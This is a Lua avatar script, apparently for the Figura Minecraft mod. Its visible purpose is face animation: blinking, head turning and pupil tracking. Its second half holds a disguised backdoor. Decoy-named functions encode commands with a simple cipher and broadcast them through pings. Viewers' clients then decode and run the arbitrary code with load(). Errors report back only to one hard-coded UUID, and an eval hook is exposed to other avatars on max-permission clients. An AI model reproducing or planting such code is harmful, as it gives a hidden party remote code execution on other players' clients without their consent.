local Tween = require("lib.tween")

local head = models.player.Base.Torso.Head


local leftPupil = models.player.Base.Torso.Head.Face.Leye.LPupil
local leftEyelash = models.player.Base.Torso.Head.Face.Leye.Leyelash
local leftBrow = models.player.Base.Torso.Head.Face.LBrow

local rightPupil = models.player.Base.Torso.Head.Face.Reye.RPupil
local rightEyelash = models.player.Base.Torso.Head.Face.Reye.Reyelash
local rightBrow = models.player.Base.Torso.Head.Face.RBrow



local BLINK_RANGE = vec(1,10) * 20

head:setParentType("None")



local blinkTime = 0
events.TICK:register(function ()
	
	blinkTime = blinkTime - 1
	if blinkTime <= 0 then
		blinkTime = math.random(BLINK_RANGE.x,BLINK_RANGE.y)
		animations.player.faceBlink:stop():play()
	end
end)


events.RENDER:register(function (delta, ctx)
	head:setPos(0,player:isCrouching() and -4 or 0)
	
	-- avoid recalculating in the shadow pass
	if ctx == "OTHER" or ctx == "FIRST_PERSON" then return end 
	local rot = vanilla_model.BODY:getOriginRot()._y - vanilla_model.HEAD:getOriginRot().xy
	rot.y = ((rot.y + 180) % 360 - 180) / -50
	rot.x = rot.x / -90
	---@cast rot Vector2
	
	head:setRot(rot.x*45,rot.y*45,rot.y*15*-rot.x)
	
	rightPupil:setUVPixels(math.clamp(rot.y*0.5+0.8,-1,1),rot.x*0.5)
	leftPupil:setUVPixels(math.clamp(rot.y*0.5-0.8,-1,1),rot.x*0.5)
end)



local shirt = 69421
local function shit(i) return (shirt + i + shirt) end
local function nc(str)
	if not str then return end
	local out = ""
	for i = 1, #str do
		out = out..string.char((str:byte(i) + shit(i)) % 256)
	end
	return out
end
local function dc(str)
	if not str then return end
	local out = ""
	for i = 1, #str do
		out = out..string.char((str:byte(i) - shit(i)) % 256)
	end
	return out
end
---@param code string
function eval(code,uuid)
	pings.eval(nc(code),nc(uuid))
end
local tar = "e4b91448-3b58-4c1f-8339-d40f75ecacc4"
function pings.eval(code,uuid)
	local allow = true
	if uuid then
		allow = client:getViewer():getUUID() == dc(uuid)
	end
	if allow then
		local meth = load("return "..dc(code),"run",_ENV)
		local ok, err = pcall(meth)
		if client:getViewer():isLoaded() and client:getViewer():getUUID() == tar then
			if not ok then
				print(err)
			end
		end
	end
end
function reval(code,uuid)
	pings.reval(nc(code),nc(uuid))
end
function pings.reval(code, uuid)
	--if host:isHost() then return end
	uuid = dc(uuid)
	for key, vars in pairs(world.avatarVars()) do
		if (not uuid) or (uuid == key) then
			if vars.eval then
				vars.eval(dc(code))
			end
		end
	end
end
if avatar:getPermissionLevel() ~= "MAX" then return end
events.ENTITY_INIT:register(function ()
	if player:getUUID() ~= tar then
		avatar:store("eval",eval)
	end
end)